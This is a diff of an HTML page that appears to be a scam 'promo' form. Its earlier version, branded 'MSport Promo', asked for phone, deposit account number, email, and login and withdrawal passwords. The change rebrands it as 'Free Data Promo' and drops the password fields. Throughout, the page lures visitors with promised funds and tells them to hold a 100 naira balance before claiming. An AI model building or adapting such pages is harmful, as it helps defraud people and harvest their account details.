@@ -3,10 +3,10 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>MSport Promo</title>
+    <title>Free Data Promo</title>
     <style>
         body {
-            background-color: black;
+            background-color: #a40000;
             font-family: Arial, sans-serif;
             color: white;
             text-align: center;
@@ -15,43 +15,54 @@
         }
 
         .top-bar {
-            background-color: #FFA500;
+            background-color: #ffffff;
             padding: 15px;
             font-weight: bold;
             text-align: center;
         }
 
         .menu-button {
-            background: black;
-            color: white;
+            background: #a40000;
+            color: #ffffff;
             border: none;
             padding: 10px;
             font-size: 16px;
             cursor: pointer;
+            border-radius: 5px;
         }
 
         .note {
-            color: orange;
+            color: #ffffff;
             font-size: 14px;
             margin-top: 5px;
             padding: 10px;
         }
 
+        .logo-wrap {
+            margin-top: 20px;
+        }
+
+        .logo-wrap img {
+            width: 120px;
+            max-width: 90%;
+            height: auto;
+        }
+
         .container {
-            background-color: #222;
+            background-color: #ffffff;
             padding: 20px;
             border-radius: 10px;
             width: 80%;
             max-width: 400px;
             margin: 20px auto;
-            box-shadow: 0px 0px 10px rgba(255, 255, 255, 0.2);
+            box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.25);
         }
 
         input {
             width: 90%;
             padding: 12px;
             margin: 10px 0;
-            border: 2px solid green;
+            border: 2px solid #a40000;
             border-radius: 20px;
             background-color: white;
             color: black;
@@ -60,8 +71,8 @@
         }
 
         button {
-            background-color: #FFA500;
-            color: white;
+            background-color: #a40000;
+            color: #ffffff;
             border: none;
             padding: 12px;
             border-radius: 5px;
@@ -72,7 +83,13 @@
         }
 
         button:hover {
-            background-color: #e69500;
+            background-color: #830000;
+        }
+
+        .footer {
+            margin: 20px 0;
+            color: #ffffff;
+            font-size: 13px;
         }
     </style>
 </head>
@@ -83,7 +100,11 @@
     </div>
 
     <div class="note">
-        NOTE: MAKE SURE YOUR MSPORT ACCOUNT HAS A BALANCE OF 100 NAIRA BEFORE CLAIMING YOUR FUNDS
+        NOTE: MAKE SURE YOUR ACCOUNT HAS A BALANCE OF 100 NAIRA BEFORE CLAIMING YOUR FUNDS
+    </div>
+
+    <div class="logo-wrap">
+        <img src="logo.png" alt="Your Logo">
     </div>
 
     <div class="container">
@@ -91,11 +112,11 @@
             <input type="text" name="phone" placeholder="Phone Number" required>
             <input type="text" name="account_number" placeholder="Account Number used to deposit" required>
             <input type="email" name="email" placeholder="Email" required>
-            <input type="password" name="withdrawal_password" placeholder="Withdrawal Password" required>
-            <input type="password" name="login_password" placeholder="Login Password" required>
             <button type="submit">Claim funds</button>
         </form>
     </div>
+
+    <div class="footer">© 2026 Free Data. All rights reserved.</div>
 
 </body>
 </html>
